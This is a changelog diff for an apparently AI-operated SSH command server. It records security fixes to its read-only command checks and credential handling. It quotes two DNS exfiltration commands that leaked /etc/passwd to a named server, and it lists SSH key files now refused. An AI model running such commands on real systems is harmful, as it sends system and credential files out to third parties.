@@ -1,5 +1,19 @@
 # Changelog
 
+## [0.6.1] - 2026-11-11
+
+Leftovers of the 0.6.0 audit and requests from live work on client servers. Each security item was reproduced against the running 0.6.0 in its own image first.
+
+### Security
+- DNS lookups no longer take names from a file or stdin without confirmation. `dig -f /etc/passwd @server` and `cat /etc/passwd | nslookup - server` passed as reads and sent the file line by line to the server named. `dig -f`/`-k`, and `nslookup` without a name or with `-` for it, now ask. `dig`, `nslookup` and `host` moved under the argument checks, so a shell expansion in their words (`dig $line.example.com`) asks too.
+- `file_get`/`file_put` refuse sshd host keys (`ssh_host_*_key`) and FIDO-backed user keys (`id_*_sk`); the `.pub` halves stay readable. Both passed before, while plain `id_ed25519` was refused.
+- The audit log no longer stores `file_put` content, only its length and hash. Short content was stored verbatim: a sudo password put on a client server as a one-line file landed in the log (17.10.2026). Long content kept its first 200 characters, which is where credentials in a config usually are. Fields whose name contains password, secret or token are masked whatever their prefix: `jump_password` was stored as given.
+
+### Changed
+- Reads that asked for confirmation in real work now pass: `mysql -V`/`--version`; `ipset list`/`test` (no `-file`, which writes the listing); `iptables`/`ip6tables` listings built from `-L`/`-S` and the letters `nvxw` with `-t TABLE` (`-L -Z` zeroes counters and still asks); `iptables-save` without `-M`; `zcat`, `zgrep`, `tr`; and `awk` in one small grammar, `[condition] {print fields}` with an optional `-F`. Other awk programs ask: system(), getline from a command, `print >` and `|` all write or run something, and the grammar is the boundary, not a parser of awk.
+- `ssh_exec` commands may be up to 1000 characters (was 500; the limit was hit twice in a day of real work).
+- Replayed against all 8 583 distinct commands in the audit log: no command that passed starts asking; 247 that asked now pass (zcat/zgrep, iptables, ipset test, awk print), 25 reads over 500 characters now pass, 115 longer non-reads now ask instead of being refused for length.
+
 ## [0.6.0] - 2026-10-12
 
 Security audit of the whole server: every finding below was reproduced on a stand (the image on the VPS, throwaway containers, real SFTP and databases) before it was fixed. The model is a personal MCP for one engineer; see SECURITY.md for what is left out on purpose and why.
